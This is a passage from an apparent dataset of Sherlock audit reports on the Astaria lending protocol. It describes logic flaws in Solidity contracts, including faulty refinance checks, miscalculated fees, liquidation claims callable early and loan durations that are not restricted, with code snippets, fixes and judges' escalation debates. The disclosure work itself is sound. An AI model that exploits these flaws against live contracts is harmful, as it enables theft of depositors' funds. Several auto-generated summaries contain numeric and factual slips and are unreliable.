      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/258 \n\n## Found by \n\\_\\_141345\\_\\_\n\n## Summary\n\nThe lenders in principal have the claim for the loan collateral, but current rule will let the liquidation caller get the collateral for free. Effectively take advantage from the vault LP, which is not fair.\n\n\n## Vulnerability Detail\n\nAfter the `endAuction()`, the collateral will be released to the initiator. Essentially, the initiator gets the NFT for free. But the lenders of the loan take the loss.\n\nHowever, the lenders should have the claim to the collateral, since originally the funds are provided by the lenders. If the collateral at the end is owned by whoever calls the liquidation function, it is not fair for the lenders. And will discourage future users to use the protocol.\n\n\n## Impact\n\n- Lenders could suffer fund loss in some cases.\n- The unfair mechanism will discourage future users.\n\n\n## Code Snippet\n\nIf there is no bidder, the winner will be assigned to the auction initiator. And the debts will all be wrote off.\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L178-L204\n\nAfter the `endAuction()`, the collateral will be released to the initiator. \nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/CollateralToken.sol#L341-L346\n\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nIf there is no bidder for the auction, allow the NFT to get auctioned for another chance.\n\n\n\n## Discussion\n\n**androolloyd**\n\nworking as intended\n\n**141345**\n\nEscalate for 3 USDC\n\nA borrower uses the NFT as collateral, the lender will get the collateral if the borrower defaults, that's how lending works normally. However, according to the current rule, anyone starts the liquidation process could potentially get the collateral, if no bidder bid on the auction. And the liquidator initiator already gets compensated by the initiator fee. \n\nCurrent rule allows for a situation that 3rd user could gain the ownership of the NFT by calling `liquidate()`. But in common practice, it is the lender should claim the ownership of the collateral.\n\nOne step further, if by any chance, the initiator could start some DoS attack and make the protocol inoperable, this rule may become part of the attack, to get the collateral for free.\n\nAlthough it is a corner case, I believe this is a business logic issue.\n\n\n**sherlock-admin**\n\n > Escalate for 3 USDC\n> \n> A borrower uses the NFT as collateral, the lender will get the collateral if the borrower defaults, that's how lending works normally. However, according to the current rule, anyone starts the liquidation process could potentially get the collateral, if no bidder bid on the auction. And the liquidator initiator already gets compensated by the initiator fee. \n> \n> Current rule allows for a situation that 3rd user could gain the ownership of the NFT by calling `liquidate()`. But in common practice, it is the lender should claim the ownership of the collateral.\n> \n> One step further, if by any chance, the initiator could start some DoS attack and make the protocol inoperable, this rule may become part of the attack, to get the collateral for free.\n> \n> Although it is a corner case, I believe this is a business logic issue.\n> \n\nYou've created a valid escalation for 3 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepted.\n\nWill be rewarded a medium as it requires the auction to end with 0 bids\n\n**sherlock-admin**\n\n> Escalation accepted.\n> \n> Will be rewarded a medium as it requires the auction to end with 0 bids\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue with the Astaria Protocol, where if an auction has no bidder, the NFT ownership should go back to the loan lenders instead of the initiator. The lenders of the loan should have the claim to the collateral, since originally the funds are provided by the lenders, but the initiator gets the NFT for free. This could lead to lenders suffering a loss of funds and discourage future users of the protocol. The code snippet provided shows that if there is no bidder, the winner will be assigned to the auction initiator and the debts will all be written off. The recommendation is to allow the NFT to get auctioned for another chance if there is no bidder. The issue was accepted and will be rewarded a medium as it requires the auction to end with 0 bids.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/258",
      "tags": [],
      "finders": [
        "\\_\\_141345\\_\\_"
      ]
    },
    {
      "id": "3676",
      "title": "M-1: new loans \"max duration\" is not restricted",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/264 \n\n## Found by \nbin2chen\n\n## Summary\ndocument :\n\"\nEpochs\n[PublicVaults](https://docs.astaria.xyz/docs/smart-contracts/PublicVault) operate around a time-based epoch system. An epoch length is defined by the strategist that deploys the [PublicVault](https://docs.astaria.xyz/docs/smart-contracts/PublicVault). The duration of new loans is restricted to not exceed the end of the next epoch. For example, if a [PublicVault](https://docs.astaria.xyz/docs/smart-contracts/PublicVault) is 15 days into a 30-day epoch, new loans must not be longer than 45 days.\n\"\nbut more than 2 epoch's duration can be added\n\n## Vulnerability Detail\nthe max duration is not detected. add success when > next epoch\n\n#AstariaTest#testBasicPublicVaultLoan\n\n```solidity\n  function testBasicPublicVaultLoan() public {\n\n  IAstariaRouter.LienDetails memory standardLien2 =\n    IAstariaRouter.LienDetails({\n      maxAmount: 50 ether,\n      rate: (uint256(1e16) * 150) / (365 days),\n      duration: 50 days,  /****** more then 14 * 2 *******/\n      maxPotentialDebt: 50 ether\n    });    \n\n    _commitToLien({\n      vault: publicVault,\n      strategist: strategistOne,\n      strategistPK: strategistOnePK,\n      tokenContract: tokenContract,\n      tokenId: tokenId,\n      lienDetails: standardLien2, /**** use standardLien2 ****/\n      amount: 10 ether,\n      isFirstLien: true\n    });\n  }\n```\n\n## Impact\nToo long duration\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/VaultImplementation.sol#L209\n\n## Tool used\n\nManual Review\n\n## Recommendation\nPublicVault#_afterCommitToLien\n```solidity\n  function _afterCommitToLien(uint256 lienId, uint256 amount)\n    internal\n    virtual\n    override\n  {\n    // increment slope for the new lien\n    unchecked {\n      slope += LIEN_TOKEN().calculateSlope(lienId);\n    }\n\n    ILienToken.Lien memory lien = LIEN_TOKEN().getLien(lienId);\n\n    uint256 epoch = Math.ceilDiv(\n      lien.start + lien.duration - START(),\n      EPOCH_LENGTH()\n    ) - 1;\n\n+   require(epoch <= currentEpoch + 1,\"epoch max <= currentEpoch + 1\");\n\n    liensOpenForEpoch[epoch]++;\n    emit LienOpen(lienId, epoch);\n  }\n\n\n```",
      "summary": "\nThis bug report is about an issue found in the Astaria platform. The issue is that the maximum duration of new loans was not restricted, allowing loans to be taken out for more than two epochs. This was found by bin2chen through manual review. \n\nThe code snippet provided shows that the issue is in the function testBasicPublicVaultLoan, where the duration of the loan is set to 50 days, which is more than the 14 days of a two epoch period. The impact of this issue is that too long a duration can be added, which can lead to potential debt. \n\nThe recommendation given is to add a require statement in the _afterCommitToLien function which will ensure that the epoch maximum is no more than one more than the current epoch. This will ensure that loans are not taken out for more than two epochs.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/264",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "3675",
      "title": "H-37: isValidRefinance will approve invalid refinances and reject valid refinances due to buggy math",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/21 \n\n## Found by \nobront, 0xRajeev, hansfriese\n\n## Summary\n\nThe math in `isValidRefinance()` checks whether the rate increased rather than decreased, resulting in invalid refinances being approved and valid refinances being rejected.\n\n## Vulnerability Detail\n\nWhen trying to buy out a lien from `LienToken.sol:buyoutLien()`, the function calls `AstariaRouter.sol:isValidRefinance()` to check whether the refi terms are valid.\n\n```solidity\nif (!ASTARIA_ROUTER.isValidRefinance(lienData[lienId], ld)) {\n  revert InvalidRefinance();\n}\n```\nOne of the roles of this function is to check whether the rate decreased by more than 0.5%. From the docs:\n\n> An improvement in terms is considered if either of these conditions is met:\n> - The loan interest rate decrease by more than 0.5%.\n> - The loan duration increases by more than 14 days.\n\nThe current implementation of the function does the opposite. It calculates a `minNewRate` (which should be `maxNewRate`) and then checks whether the new rate is greater than that value.\n\n```solidity\nuint256 minNewRate = uint256(lien.rate) - minInterestBPS;\nreturn (newLien.rate >= minNewRate ...\n```\n\nThe result is that if the new rate has increased (or decreased by less than 0.5%), it will be considered valid, but if it has decreased by more than 0.5% (the ideal behavior) it will be rejected as invalid.\n\n## Impact\n\n- Users can perform invalid refinances with the wrong parameters.\n- Users who should be able to perform refinances at better rates will not be able to.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L482-L491\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nFlip the logic used to check the rate to the following:\n\n```solidity\nuint256 maxNewRate = uint256(lien.rate) - minInterestBPS;\nreturn (newLien.rate <= maxNewRate...\n```\n\n## Discussion\n\n**IAmTurnipBoy**\n\nEscalate for 1 USDC\n\nShould be medium because no funds at risk\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> Should be medium because no funds at risk\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation rejected.\n\nNot a major loss of funds but definitely a severe flaw that will hurt the protocol.\n\n**sherlock-admin**\n\n> Escalation rejected.\n> \n> Not a major loss of funds but definitely a severe flaw that will hurt the protocol.\n\nThis issue's escalations have been rejected!\n\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "summary": "\nThis bug report is about a vulnerability found in the code of AstariaRouter.sol:isValidRefinance(). This function is used to check if the refinance terms are valid when trying to buy out a lien from LienToken.sol:buyoutLien(). The current implementation of the function checks whether the rate increased rather than decreased, resulting in invalid refinances being approved and valid refinances being rejected. This is an issue because it means users can perform invalid refinances with the wrong parameters, and users who should be able to perform refinances at better rates will not be able to. \n\nThe code snippet provided shows the logic used to check the rate, which should be flipped to the following:\n\n```solidity\nuint256 maxNewRate = uint256(lien.rate) - minInterestBPS;\nreturn (newLien.rate <= maxNewRate...\n```\n\nThe bug was found by obront, 0xRajeev, and hansfriese, and the discussion that followed was about whether the issue should be escalated for 1 USDC, which was rejected due to it not being a major loss of funds, but still being a severe flaw that would hurt the protocol.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/21",
      "tags": [],
      "finders": [
        "0xRajeev",
        "obront",
        "hansfriese"
      ]
    },
    {
      "id": "3674",
      "title": "H-36: isValidRefinance checks both conditions instead of one, leading to rejection of valid refinances",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/22 \n\n## Found by \nobront\n\n## Summary\n\n`isValidRefinance()` is intended to check whether either (a) the loan interest rate decreased sufficiently or (b) the loan duration increased sufficiently. Instead, it requires both of these to be true, leading to the rejection of valid refinances.\n\n## Vulnerability Detail\n\nWhen trying to buy out a lien from `LienToken.sol:buyoutLien()`, the function calls `AstariaRouter.sol:isValidRefinance()` to check whether the refi terms are valid.\n\n```solidity\nif (!ASTARIA_ROUTER.isValidRefinance(lienData[lienId], ld)) {\n  revert InvalidRefinance();\n}\n```\n\nOne of the roles of this function is to check whether the rate decreased by more than 0.5%. From the docs:\n\n> An improvement in terms is considered if either of these conditions is met:\n> - The loan interest rate decrease by more than 0.5%.\n> - The loan duration increases by more than 14 days.\n\nThe currently implementation of the code requires both of these conditions to be met:\n\n```solidity\nreturn (\n    newLien.rate >= minNewRate &&\n    ((block.timestamp + newLien.duration - lien.start - lien.duration) >= minDurationIncrease)\n);\n```\n\n## Impact\n\nValid refinances that meet one of the two criteria will be rejected.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L488-L490\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nChange the AND in the return statement to an OR:\n\n```solidity\nreturn (\n    newLien.rate >= minNewRate ||\n    ((block.timestamp + newLien.duration - lien.start - lien.duration) >= minDurationIncrease)\n);\n```\n\n## Discussion\n\n**SantiagoGregory**\n\nIndependently fixed during our own review so there's no PR specifically for this, but this is now updated to an or.\n\n**IAmTurnipBoy**\n\nEscalate for 1 USDC\n\nShould be medium because there are no funds at risk\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> Should be medium because there are no funds at risk\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation rejected.\n\nNot a major loss of funds but definitely a severe flaw that will hurt the protocol.\n\n**sherlock-admin**\n\n> Escalation rejected.\n> \n> Not a major loss of funds but definitely a severe flaw that will hurt the protocol.\n\nThis issue's escalations have been rejected!\n\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "summary": "\nThis bug report is about the `isValidRefinance()` function in the AstariaRouter.sol file of the Sherlock-Audit project. This function is intended to check whether either (a) the loan interest rate decreased sufficiently or (b) the loan duration increased sufficiently when trying to buy out a lien. However, the current implementation requires both of these conditions to be met, leading to the rejection of valid refinances. The code snippet and recommendation for fixing this issue have been included in the report. The issue has been discussed and an escalation for 1 USDC was rejected.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/22",
      "tags": [],
      "finders": [
        "obront"
      ]
    },
    {
      "id": "3673",
      "title": "H-35: Incorrect fees will be charged",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/36 \n\n## Found by \ncsanuragjain\n\n## Summary\nIf user has provided transferAmount which is greater than all lien.amount combined then initiatorPayment will be incorrect since it is charged on full amount when only partial was used as shown in poc\n\n## Vulnerability Detail\n1. Observe the _handleIncomingPayment function\n2. Lets say transferAmount was 1000\n3. initiatorPayment is calculated on this full transferAmount\n\n```python\nuint256 initiatorPayment = transferAmount.mulDivDown(\n      auction.initiatorFee,\n      100\n    ); \n```\n\n4. Now all lien are iterated and lien.amount is kept on deducting from transferAmount until all lien are navigated\n\n```python\nif (transferAmount >= lien.amount) {\n          payment = lien.amount;\n          transferAmount -= payment;\n        } else {\n          payment = transferAmount;\n          transferAmount = 0;\n        }\n\n        if (payment > 0) {\n          LIEN_TOKEN.makePayment(tokenId, payment, lien.position, payer);\n        }\n      }\n```\n\n5. Lets say after loop completes the transferAmount is still left as 100 \n6. This means only 400 transferAmount was used but fees was deducted on full amount 500\n\n## Impact\nExcess initiator fees will be deducted which was not required\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L276\n\n## Tool used\nManual Review\n\n## Recommendation\nCalculate the exact amount of transfer amount required for the transaction and calculate the initiator fee based on this amount\n\n## Discussion\n\n**IAmTurnipBoy**\n\nEscalate for 1 USDC\n\nThe fee is not the problem, so this report is invalid. The issue is that the payment isn't working as intended and that sometimes it doesn't take as much as it should. See #107.\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> The fee is not the problem, so this report is invalid. The issue is that the payment isn't working as intended and that sometimes it doesn't take as much as it should. See #107.\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation rejected.\n\nThis is a valid finding as fees are too high - Fees should be calculated based on the actual amount used as the repayment\n\n**sherlock-admin**\n\n> Escalation rejected.\n> \n> This is a valid finding as fees are too high - Fees should be calculated based on the actual amount used as the repayment\n\nThis issue's escalations have been rejected!\n\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "summary": "\nIssue H-35 is a bug found by csanuragjain in the handleIncomingPayment function of the AuctionHouse.sol code in the Astaria project. If the transferAmount is greater than the combined amount of all lien.amounts, then the initiatorPayment is calculated on the full transferAmount, even though only a partial amount was used. This means that an excess initiator fee is charged that was not required, leading to an incorrect fee being charged. This was confirmed by the discussion between IAmTurnipBoy, sherlock-admin, and Evert0x, where the issue was accepted as a valid finding and the escalation was rejected. As a result, the Watsons who escalated the issue will have their escalation amount deducted from their next payout. The recommendation is to calculate the exact amount of transfer amount required for the transaction and calculate the initiator fee based on this amount.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/36",
      "tags": [],
      "finders": [
        "csanuragjain"
      ]
    },
    {
      "id": "3672",
      "title": "H-34: liquidationAccountant can be claimed at any time",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/46 \n\n## Found by \nobront\n\n## Summary\n\nNew liquidations are sent to the `liquidationAccountant` with a `finalAuctionTimestamp` value, but the actual value that is passed in is simply the duration of an auction. The `claim()` function uses this value in a require check, so this error will allow it to be called before the auction is complete.\n\n## Vulnerability Detail\n\nWhen a lien is liquidated, `AstariaRouter.sol:liquidate()` is called. If the lien is set to end in a future epoch, we call `handleNewLiquidation()` on the `liquidationAccountant`.\n\nOne of the values passed in this call is the `finalAuctionTimestamp`, which updates the `finalAuctionEnd` variable in the `liquidationAccountant`. This value is then used to protect the `claim()` function from being called too early.\n\nHowever, when the router calls `handleLiquidationAccountant()`, it passes the duration of an auction rather than the final timestamp:\n\n```solidity\nLiquidationAccountant(accountant).handleNewLiquidation(\n  lien.amount,\n  COLLATERAL_TOKEN.auctionWindow() + 1 days\n);\n```\nAs a result, `finalAuctionEnd` will be set to 259200 (3 days). \n\nWhen `claim()` is called, it requires the final auction to have ended for the function to be called:\n\n```solidity\nrequire(\n  block.timestamp > finalAuctionEnd || finalAuctionEnd == uint256(0),\n  \"final auction has not ended\"\n);\n```\nBecause of the error above, `block.timestamp` will always be greater than `finalAuctionEnd`, so this will always be permitted. \n\n## Impact\n\nAnyone can call `claim()` before an auction has ended. This can cause many problems, but the clearest is that it can ruin the protocol's accounting by decreasing the Y intercept of the vault. \n\nFor example, if `claim()` is called before the auction, the returned value will be 0, so the Y intercept will be decreased as if there was an auction that returned no funds. \n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L407-L410\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LiquidationAccountant.sol#L113-L120\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LiquidationAccountant.sol#L65-L69\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdjust the call from the router to use the ending timestamp as the argument, rather than the duration:\n\n```solidity\nLiquidationAccountant(accountant).handleNewLiquidation(\n  lien.amount,\n  block.timestamp + COLLATERAL_TOKEN.auctionWindow() + 1 days\n);\n```\n\n## Discussion\n\n**IAmTurnipBoy**\n\nEscalate for 1 USDC\n\nTouched on the same idea as #135. Tough call on duplication. This issue + #47 combine represent the same vulnerability fixed in both #135 and #188. In this issue it addresses being called too early and in #47 it addresses being called multiple times. The fix proposed in #135 and #188 address both issues by permissioning the function. IMHO this and 47 should be duped with #135 and #188, but up to judges. \n\nALSO little bit of a conflict of interest that @zobront validated his own issue here.\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> Touched on the same idea as #135. Tough call on duplication. This issue + #47 combine represent the same vulnerability fixed in both #135 and #188. In this issue it addresses being called too early and in #47 it addresses being called multiple times. The fix proposed in #135 and #188 address both issues by permissioning the function. IMHO this and 47 should be duped with #135 and #188, but up to judges. \n> \n> ALSO little bit of a conflict of interest that @zobront validated his own issue here.\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepted.\n\n#135 and #188 are already duplicates. This issue and #47 touch on the same core issue that `claim()` is not safe to be publicly callable. \n\n**sherlock-admin**\n\n> Escalation accepted.\n> \n> #135 and #188 are already duplicates. This issue and #47 touch on the same core issue that `claim()` is not safe to be publicly callable. \n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.\n\n**zobront**\n\nEscalate for 5 USDC\n\nThis isn’t a dup of #135 or #188. Those two issues are talking about access control for the function. This calls out that there is a specific time enforcement mechanism (`finalAuctionTimestamp`) that is calculated incorrectly, allowing it to be called early.\n\nYes, I agree that adding access controls (their solution) would reduce the harm from this issue, but they are unrelated issues that just happen to have overlapping solutions. The real solution to this one is to do the calculation properly.\n\nNOTE: The other issue of mine that was dup’d with these is #47, which focuses on that there aren’t restrictions to stop `claim()` being called multiple times. I probably wouldn’t consider that a dup of theirs either, but it’s on the fence so I’m ok with it — but this one is clearly different.\n\n**sherlock-admin**\n\n > Escalate for 5 USDC\n> \n> This isn’t a dup of #135 or #188. Those two issues are talking about access control for the function. This calls out that there is a specific time enforcement mechanism (`finalAuctionTimestamp`) that is calculated incorrectly, allowing it to be called early.\n> \n> Yes, I agree that adding access controls (their solution) would reduce the harm from this issue, but they are unrelated issues that just happen to have overlapping solutions. The real solution to this one is to do the calculation properly.\n> \n> NOTE: The other issue of mine that was dup’d with these is #47, which focuses on that there aren’t restrictions to stop `claim()` being called multiple times. I probably wouldn’t consider that a dup of theirs either, but it’s on the fence so I’m ok with it — but this one is clearly different.\n\nYou've created a valid escalation for 5 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepted. at the initial escalation we misinterpreted the https://github.com/sherlock-audit/2022-10-astaria-judging/issues/135 / https://github.com/sherlock-audit/2022-10-astaria-judging/issues/188 as it was thought they described both issues. \n\n**sherlock-admin**\n\n> Escalation accepted. at the initial escalation we misinterpreted the https://github.com/sherlock-audit/2022-10-astaria-judging/issues/135 / https://github.com/sherlock-audit/2022-10-astaria-judging/issues/188 as it was thought they described both issues. \n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue found in the AstariaRouter.sol and LiquidationAccountant.sol contracts. The issue is that when a lien is liquidated, the liquidationAccountant is called with a `finalAuctionTimestamp` value that is simply the duration of an auction. This value is then used to protect the `claim()` function from being called too early, but it is set to 259200 (3 days) instead of the ending timestamp, so the `block.timestamp` will always be greater than `finalAuctionEnd`. As a result, anyone can call `claim()` before an auction has ended, which can cause many problems including ruining the protocol's accounting. The recommended fix is to adjust the call from the router to use the ending timestamp as the argument, rather than the duration. This issue was found by obront and validated by zobront. There were two escalations for 1 USDC and 5 USDC, which were accepted by sherlock-admin. The issue was thought to be a duplicate of issues #135 and #188, but it was determined that these two issues are talking about access control for the function, while this issue calls out that there is a specific time enforcement mechanism that is calculated incorrectly.",
      "quality_score": 2,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/46",
      "tags": [
        "Timing"
      ],
      "finders": [
        "obront"
      ]
    },
    {
      "id": "3671",
      "title": "H-33: Claiming liquidationAccountant will reduce vault y-intercept by more than the correct amount",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/48 \n\n## Found by \nobront\n\n## Summary\n\nWhen `claim()` is called on the Liquidation Accountant, it decreases the y-intercept based on the balance of the contract after funds have been distributed, rather than before. The result is that the y-intercept will be decreased more than it should be, siphoning funds from all users.\n\n## Vulnerability Detail\n\nWhen `LiquidationAccountant.sol:claim()` is called, it uses its `withdrawRatio` to send some portion of its earnings to the `WITHDRAW_PROXY` and the rest to the vault.\n\nAfter performing these transfers, it updates the vault's y-intercept, decreasing it by the gap between the expected return from the auction, and the reality of how much was sent back to the vault:\n\n```solidity\nPublicVault(VAULT()).decreaseYIntercept(\n  (expected - ERC20(underlying()).balanceOf(address(this))).mulDivDown(\n    1e18 - withdrawRatio,\n    1e18\n  )\n);\n```\nThis rebalancing uses the balance of the `liquidationAccountant` to perform its calculation, but it is done after the balance has already been distributed, so it will always be 0.\n\nLooking at an example:\n- `expected = 1 ether` (meaning the y-intercept is currently based on this value)\n- `withdrawRatio = 0` (meaning all funds will go back to the vault)\n- The auction sells for exactly 1 ether\n- 1 ether is therefore sent directly to the vault\n- In this case, the y-intercept should not be updated, as the outcome was equal to the expected outcome\n- However, because the calculation above happens after the funds are distributed, the decrease equals `(expected - 0) * 1e18 / 1e18`, which equals `expected`\n\nThat decrease should not happen, and causing problems for the protocol's accounting. For example, when `withdraw()` is called, it uses the y-intercept in its calculation of the `totalAssets()` held by the vault, creating artificially low asset values for a given number of shares.\n\n## Impact\n\nEvery time the liquidation accountant is used, the vault's math will be thrown off and user shares will be falsely diluted.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LiquidationAccountant.sol#L62-L97\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe amount of assets sent to the vault has already been calculated, as we've already sent it. Therefore, rather than the full existing formula, we can simply call:\n\n```solidity\nPublicVault(VAULT()).decreaseYIntercept(expected - balance)\n```\n\nAlternatively, we can move the current code above the block of code that transfers funds out (L73).",
      "summary": "\nThis bug report is about an issue found in the Liquidation Accountant contract in the Sherlock Audit's 2022-10-astaria-judging repository. The issue was found by obront. When `claim()` is called on the Liquidation Accountant, it decreases the y-intercept based on the balance of the contract after funds have been distributed, rather than before. This causes the y-intercept to be decreased more than it should be, siphoning funds from all users and throwing off the vault's math. This issue can be resolved by calling `PublicVault(VAULT()).decreaseYIntercept(expected - balance)` or by moving the current code above the block of code that transfers funds out.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/48",
      "tags": [],
      "finders": [
        "obront"
      ]
    },
    {
      "id": "3670",
      "title": "H-32: Strategists are paid 10x the vault fee because of a math error",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/49 \n\n## Found by \nobront\n\n## Summary\n\nStrategists set their vault fee in BPS (x / 10,000), but are paid out as x / 1,000. The result is that strategists will always earn 10x whatever vault fee they set.\n\n## Vulnerability Detail\n\nWhenever any payment is made towards a public vault, `beforePayment()` is called, which calls `_handleStrategistInterestReward()`.\n\nThe function is intended to take the amount being paid, adjust by the vault fee to get the fee amount, and convert that amount of value into shares, which are added to `strategistUnclaimedShares`.\n\n```solidity\nfunction _handleStrategistInterestReward(uint256 lienId, uint256 amount)\n    internal\n    virtual\n    override\n  {\n    if (VAULT_FEE() != uint256(0)) {\n      uint256 interestOwing = LIEN_TOKEN().getInterest(lienId);\n      uint256 x = (amount > interestOwing) ? interestOwing : amount;\n      uint256 fee = x.mulDivDown(VAULT_FEE(), 1000);\n      strategistUnclaimedShares += convertToShares(fee);\n    }\n  }\n```\nSince the vault fee is stored in basis points, to get the vault fee, we should take the amount, multiply it by `VAULT_FEE()` and divide by 10,000. However, we accidentally divide by 1,000, which results in a 10x larger reward for the strategist than intended.\n\nAs an example, if the vault fee is intended to be 10%, we would set `VAULT_FEE = 1000`. In that case, for any amount paid off, we would calculate `fee = amount * 1000 / 1000` and the full amount would be considered a fee for the strategist.\n\n## Impact\n\nStrategists will be paid 10x the agreed upon rate for their role, with the cost being borne by users.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L513-L524\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nChange the `1000` in the `_handleStrategistInterestReward()` function to `10_000`.\n\n## Discussion\n\n**IAmTurnipBoy**\n\nEscalate for 1 USDC\n\nDon't agree with high severity. Fee can easily be changed by protocol after the fact to fix this, which is why medium makes more sense. Simple to fix as a parameter change.\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> Don't agree with high severity. Fee can easily be changed by protocol after the fact to fix this, which is why medium makes more sense. Simple to fix as a parameter change.\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepted.\n\n\n**sherlock-admin**\n\n> Escalation accepted.\n> \n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.\n\n**zobront**\n\nEscalate for 5 USDC\n\nVAULT_FEE() is set as an immutable arg when vault is deployed using ClonesWithImmutableArgs. There is no ability to change it later as the escalation claims. This value would be hard coded in all vaults created.\n\nThe result is that vault strategists would be given all of the funds of users who deposit in their vault, irretrievably stealing funds from users of the protocol. This is definitely a high.\n\n**sherlock-admin**\n\n > Escalate for 5 USDC\n> \n> VAULT_FEE() is set as an immutable arg when vault is deployed using ClonesWithImmutableArgs. There is no ability to change it later as the escalation claims. This value would be hard coded in all vaults created.\n> \n> The result is that vault strategists would be given all of the funds of users who deposit in their vault, irretrievably stealing funds from users of the protocol. This is definitely a high.\n\nYou've created a valid escalation for 5 USDC!\n\nTo remove the escalation from 